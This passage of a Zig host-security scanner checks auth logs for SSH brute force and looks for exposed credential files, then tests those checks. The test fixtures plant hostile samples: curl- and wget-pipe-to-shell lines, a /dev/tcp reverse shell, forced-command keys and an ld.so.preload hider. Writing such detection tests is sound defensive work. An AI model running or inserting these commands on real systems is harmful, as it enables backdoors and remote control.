        defer s.gpa.free(text);
        const n = file.readPositionalAll(s.host.io, text, st.size - tail) catch continue;
        read_any = true;
        var lines = std.mem.splitScalar(u8, text[0..n], '\n');
        while (lines.next()) |line| switch (parseAuthLine(line) orelse continue) {
            .failure => |addr| {
                const gop = try counts.getOrPut(s.gpa, try s.dupe(addr));
                if (!gop.found_existing) gop.value_ptr.* = 0;
                gop.value_ptr.* += 1;
            },
            .success => |addr| if ((counts.get(addr) orelse 0) >= 20) try successes.append(s.gpa, try s.dupe(addr)),
        };
    }
    if (!read_any) {
        if (denied > 0) try s.reduced("the auth log is readable only by root and adm", .{}) else if (s.host.exists("/var/log/journal")) try s.reduced("no text auth log; the systemd journal is not parsed", .{});
        return;
    }
    for (successes.items) |addr| try s.add(.{
        .severity = .critical,
        .category = .access,
        .title = "Successful SSH login after brute force",
        .description = try s.print("{s} logged in after {d} failed attempts. A brute-force attack may have succeeded.", .{ addr, counts.get(addr) orelse 0 }),
        .remediation = "Identify the account (auth log), lock it, kill its sessions, rotate its credentials and audit what it did.",
        .subject = addr,
    });
    var total: u32 = 0;
    var it = counts.iterator();
    while (it.next()) |kv| {
        total += kv.value_ptr.*;
        if (kv.value_ptr.* < 20) continue;
        try s.add(.{
            .severity = if (kv.value_ptr.* >= 100) .high else .medium,
            .category = .access,
            .title = "SSH brute force from one address",
            .description = try s.print("{s} failed to authenticate {d} times in the recent auth log.", .{ kv.key_ptr.*, kv.value_ptr.* }),
            .remediation = "Disable password authentication, and block the address or run fail2ban or sshguard.",
            .subject = kv.key_ptr.*,
            .details = try s.details(&.{.{ .key = "failures", .value = try s.print("{d}", .{kv.value_ptr.*}) }}),
        });
    }
}

// Credentials -----------------------------------------------------------------------------------

const credential_files = [_]struct { rel: []const u8, what: []const u8 }{
    .{ .rel = ".aws/credentials", .what = "AWS access keys" },
    .{ .rel = ".netrc", .what = "netrc passwords" },
    .{ .rel = ".git-credentials", .what = "git credentials" },
    .{ .rel = ".docker/config.json", .what = "Docker registry credentials" },
    .{ .rel = ".npmrc", .what = "npm tokens" },
    .{ .rel = ".pgpass", .what = "PostgreSQL passwords" },
    .{ .rel = ".kube/config", .what = "Kubernetes credentials" },
    .{ .rel = ".config/gh/hosts.yml", .what = "GitHub CLI tokens" },
};

fn exposure(s: *scan.Scan, path: []const u8, home_mode: u32, what: []const u8, user: []const u8) !void {
    const st = s.host.stat(path, true) catch return;
    if (st.kind() != .file) return;
    const traversable = home_mode & 0o001 != 0;
    const world = st.worldReadable() and traversable;
    const group = st.groupReadable() and home_mode & 0o010 != 0;
    if (!world and !group) return;
    try s.add(.{
        .severity = if (world) .high else .medium,
        .category = .credential,
        .title = if (world) "Credentials readable by every user" else "Credentials readable by the group",
        .description = try s.print("{s} ({s} of {s}) has mode {o}; {s} can read it.", .{ path, what, user, st.mode & 0o777, if (world) "any local user" else "members of its group" }),
        .remediation = try s.print("chmod 600 {s}; rotate the credentials if other users had access.", .{path}),
        .subject = path,
    });
}

fn checkCredentials(s: *scan.Scan) !void {
    for ([_][]const u8{ "/etc/shadow", "/etc/gshadow" }) |p| {
        const st = s.host.stat(p, false) catch continue;
        if (!st.worldReadable()) continue;
        try s.add(.{
            .severity = .critical,
            .category = .credential,
            .title = "Password hashes readable by every user",
            .description = try s.print("{s} has mode {o}: any local user can copy the password hashes and crack them offline.", .{ p, st.mode & 0o777 }),
            .remediation = try s.print("chmod 640 {s} (root:shadow) or 000 on Fedora-family systems, and force password changes if it was exposed.", .{p}),
            .subject = p,
        });
    }
    var denied: usize = 0;
    if (readText(s, "/etc/environment", &denied)) |text| {
        var lines = std.mem.splitScalar(u8, text, '\n');
        while (lines.next()) |raw| {
            const line = std.mem.trim(u8, raw, " \t\r");
            const eq = std.mem.indexOfScalar(u8, line, '=') orelse continue;
            const key = line[0..eq];
            const secretish = std.mem.endsWith(u8, key, "_TOKEN") or std.mem.endsWith(u8, key, "_SECRET") or std.mem.endsWith(u8, key, "SECRET_ACCESS_KEY") or std.mem.endsWith(u8, key, "PASSWORD") or std.mem.endsWith(u8, key, "_API_KEY");
            if (!secretish or eq + 1 >= line.len) continue;
            try s.add(.{
                .severity = .medium,
                .category = .credential,
                .title = "Secret in /etc/environment",
                .description = try s.print("/etc/environment sets {s}; the file is world-readable and the value reaches every login session.", .{key}),
                .remediation = "Move the secret to a root-only file read by the one service that needs it (systemd LoadCredential= or EnvironmentFile= with mode 600) and rotate it.",
                .subject = "/etc/environment",
                .details = try s.details(&.{.{ .key = "variable", .value = try s.dupe(key) }}),
            });
        }
    }
    for (try users(s)) |u| {
        const home_st = s.host.stat(u.home, true) catch continue;
        for (try listDir(s, try s.print("{s}/.ssh", .{u.home}), &denied)) |p| {
            const base = tokens.basename(p);
            if (!std.mem.startsWith(u8, base, "id_") or std.mem.endsWith(u8, base, ".pub")) continue;
            var head_buf: [64]u8 = undefined;
            const head = s.host.readOpt(p, &head_buf) orelse "-----BEGIN";
            if (!std.mem.startsWith(u8, head, "-----BEGIN")) continue;
            try exposure(s, p, home_st.mode, "SSH private key", u.name);
        }
        for (credential_files) |c| try exposure(s, try s.print("{s}/{s}", .{ u.home, c.rel }), home_st.mode, c.what, u.name);
    }
    if (denied > 0) try s.reduced("{d} home directories were unreadable without root", .{denied});
}

// Tests -----------------------------------------------------------------------------------------

const Fixture = @import("../host.zig").Fixture;

test "crontab and unit parsing" {
    try std.testing.expectEqualStrings("root test -x /usr/sbin/anacron", cronCommand("17 *\t* * * root test -x /usr/sbin/anacron", false).?);
    try std.testing.expectEqualStrings("test -x /usr/sbin/anacron", cronCommand("17 * * * * root test -x /usr/sbin/anacron", true).?);
    try std.testing.expectEqualStrings("/tmp/.x/upd", cronCommand("@reboot /tmp/.x/upd", false).?);
    try std.testing.expect(cronCommand("SHELL=/bin/sh", true) == null);
    try std.testing.expect(cronCommand("# m h dom mon dow", true) == null);
    const u = parseUnit("[Service]\nType=simple\nExecStartPre=-/usr/bin/true\nExecStart=/opt/app/run --port 80\nUser=app\nNoNewPrivileges=yes\n");
    try std.testing.expectEqual(@as(usize, 2), u.exec_count);
    try std.testing.expectEqualStrings("/usr/bin/true", u.exec[0]);
    try std.testing.expectEqualStrings("app", u.user);
    try std.testing.expect(u.sandboxed);
}

test "authorized keys, fingerprints and auth log lines" {
    const k = parseAuthorizedKey("command=\"/usr/bin/curl -s http://x/a | sh\",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl a@b").?;
    try std.testing.expectEqualStrings("ssh-ed25519", k.key_type);
    try std.testing.expectEqualStrings("a@b", k.comment);
    try std.testing.expectEqualStrings("/usr/bin/curl -s http://x/a | sh", forcedCommand(k.options).?);
    var fp: [64]u8 = undefined;
    try std.testing.expectEqualStrings("SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU", fingerprint(k.blob_b64, &fp).?);
    try std.testing.expect(parseAuthorizedKey("# comment") == null);
    try std.testing.expect(parseAuthorizedKey("ssh-rsa") == null);
    try std.testing.expectEqualStrings("203.0.113.9", parseAuthLine("Nov 17 10:00:01 host sshd[123]: Failed password for invalid user admin from 203.0.113.9 port 4242 ssh2").?.failure);
    try std.testing.expectEqualStrings("203.0.113.9", parseAuthLine("Nov 17 10:05:01 host sshd[130]: Accepted password for deploy from 203.0.113.9 port 4250 ssh2").?.success);
    try std.testing.expect(parseAuthLine("Nov 17 cron[1]: session opened") == null);
}

fn writeUsers(fx: *Fixture) !void {
    try fx.file("/etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\nalice:x:1000:1000::/home/alice:/bin/bash\n");
    try fx.dir("/root");
    try fx.dir("/home/alice/.ssh");
}

test "fixture: one finding per persistence kind, with remediation" {
    var fx = try Fixture.init();
    defer fx.deinit();
    try writeUsers(&fx);
    try fx.file("/etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n*/5 * * * * root curl -fsSL http://203.0.113.5/x.sh | bash\n");
    try fx.file("/var/spool/cron/crontabs/alice", "@reboot /tmp/.cache/upd >/dev/null 2>&1\n");
    try fx.file("/var/spool/cron/atjobs/a0001", "#!/bin/sh\nbash -i >& /dev/tcp/203.0.113.5/443 0>&1\n");
    try fx.file("/etc/systemd/system/dbus-sync.service", "[Service]\nExecStart=/dev/shm/.d/dbus-sync\n");
    try fx.file("/lib/systemd/system/ssh.service", "[Service]\nExecStart=/usr/sbin/sshd -D\n");
    try fx.file("/etc/ld.so.preload", "/usr/local/lib/libprocesshider.so\n");
    try fx.file("/home/alice/.bashrc", "alias ll='ls -l'\nwget -qO- http://203.0.113.5/k | sh\n");
    try fx.file("/root/.ssh/authorized_keys", "command=\"curl http://x/y | sh\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl x\n");
    try fx.file("/etc/ssh/sshd_config", "Include /etc/ssh/sshd_config.d/*.conf\nPermitRootLogin yes\nMatch User git\n  PasswordAuthentication no\n");
    try fx.file("/etc/ssh/sshd_config.d/50-cloud.conf", "PasswordAuthentication no\nPermitEmptyPasswords yes\n");
    var auth: std.ArrayList(u8) = .empty;
    defer auth.deinit(std.testing.allocator);
    for (0..25) |_| try auth.appendSlice(std.testing.allocator, "Nov 17 10:00:01 h sshd[1]: Failed password for root from 198.51.100.7 port 1 ssh2\n");
    try auth.appendSlice(std.testing.allocator, "Nov 17 10:09:01 h sshd[2]: Accepted password for root from 198.51.100.7 port 2 ssh2\n");
    try fx.file("/var/log/auth.log", auth.items);
    try fx.fileMode("/etc/shadow", "root:*:1::::::\n", 0o644);
    try fx.fileMode("/home/alice/.ssh/id_ed25519", "-----BEGIN OPENSSH PRIVATE KEY-----\n", 0o644);
    try fx.chmod("/home/alice", 0o755);
    try fx.file("/etc/environment", "PATH=\"/usr/bin\"\nAWS_SECRET_ACCESS_KEY=abc123\n");
    // ssh.service is owned; nothing else is.
    try fx.file("/var/lib/dpkg/status", "Package: openssh-server\nStatus: install ok installed\nVersion: 1\n");
    try fx.file("/var/lib/dpkg/info/openssh-server.list", "/lib/systemd/system/ssh.service\n/usr/sbin/sshd\n");

    var s = scan.Scan.init(std.testing.allocator, fx.host(.linux), .{ .only = &.{ "persistence", "access", "credential" }, .context = .{ .role = .server, .services = .initOne(.sshd) } });
    defer s.deinit();
    try s.runChecks(&checks);
    const want = [_]struct { check: []const u8, subject: []const u8 }{
        .{ .check = "persistence.cron", .subject = "/etc/crontab" },
        .{ .check = "persistence.cron", .subject = "/var/spool/cron/crontabs/alice" },
        .{ .check = "persistence.at", .subject = "/var/spool/cron/atjobs/a0001" },
        .{ .check = "persistence.systemd", .subject = "/etc/systemd/system/dbus-sync.service" },
        .{ .check = "persistence.preload", .subject = "/usr/local/lib/libprocesshider.so" },
        .{ .check = "persistence.shell_rc", .subject = "/home/alice/.bashrc" },
        .{ .check = "access.ssh_keys", .subject = "/root/.ssh/authorized_keys" },
        .{ .check = "access.sshd_root_login", .subject = "/etc/ssh/sshd_config" },
        .{ .check = "access.sshd_empty_passwords", .subject = "/etc/ssh/sshd_config" },
        .{ .check = "access.brute_force", .subject = "198.51.100.7" },
        .{ .check = "credential.exposure", .subject = "/etc/shadow" },
        .{ .check = "credential.exposure", .subject = "/home/alice/.ssh/id_ed25519" },
        .{ .check = "credential.exposure", .subject = "/etc/environment" },
    };
    for (want) |w| {
        var ok = false;
        for (s.findings.items) |f| if (std.mem.eql(u8, f.check, w.check) and std.mem.eql(u8, f.subject orelse "", w.subject)) {
            ok = f.remediation.len > 0;
        };
        if (!ok) {
            std.debug.print("missing finding {s} {s}\n", .{ w.check, w.subject });
            return error.TestUnexpectedResult;
        }
    }
    for (s.findings.items) |f| {
        // The drop-in's PasswordAuthentication no wins (first value); the owned unit is quiet.
        try std.testing.expect(!std.mem.eql(u8, f.check, "access.sshd_password"));
        try std.testing.expect(!std.mem.eql(u8, f.subject orelse "", "/lib/systemd/system/ssh.service"));
    }
}

test "a baseline run followed by an added authorized key reports exactly that key" {
    var fx = try Fixture.init();
    defer fx.deinit();
    try writeUsers(&fx);
    const key1 = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl ops@laptop\n";
    const key2 = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBFXmP7X2g8sYVmHRsXHnYb5yVJjaJMdHaHiSVQxMkSl evil@box\n";
    try fx.file("/home/alice/.ssh/authorized_keys", key1);
    try fx.dir("/state");
    var state = try fx.tmp.dir.openDir(std.testing.io, "state", .{});
    defer state.close(std.testing.io);

    var first = scan.Scan.init(std.testing.allocator, fx.host(.linux), .{ .only = &.{"access.ssh_keys"}, .state_dir = state, .update_baseline = true, .context = .{ .role = .server } });
    try first.runChecks(&checks);
    try std.testing.expectEqual(@as(usize, 0), first.findings.items.len);
    first.deinit();

    try fx.file("/home/alice/.ssh/authorized_keys", key1 ++ key2);
    var second = scan.Scan.init(std.testing.allocator, fx.host(.linux), .{ .only = &.{"access.ssh_keys"}, .state_dir = state, .context = .{ .role = .server } });
    defer second.deinit();
    try second.runChecks(&checks);
    try std.testing.expectEqual(@as(usize, 1), second.findings.items.len);
    const f = second.findings.items[0];
    try std.testing.expectEqualStrings("SSH key added since the baseline", f.title);
    var fp: [64]u8 = undefined;
    const want = fingerprint(parseAuthorizedKey(key2).?.blob_b64, &fp).?;
    for (f.details) |d| if (std.mem.eql(u8, d.key, "fingerprint")) try std.testing.expectEqualStrings(want, d.value);
    for (f.details) |d| if (std.mem.eql(u8, d.key, "comment")) try std.testing.expectEqualStrings("evil@box", d.value);
}
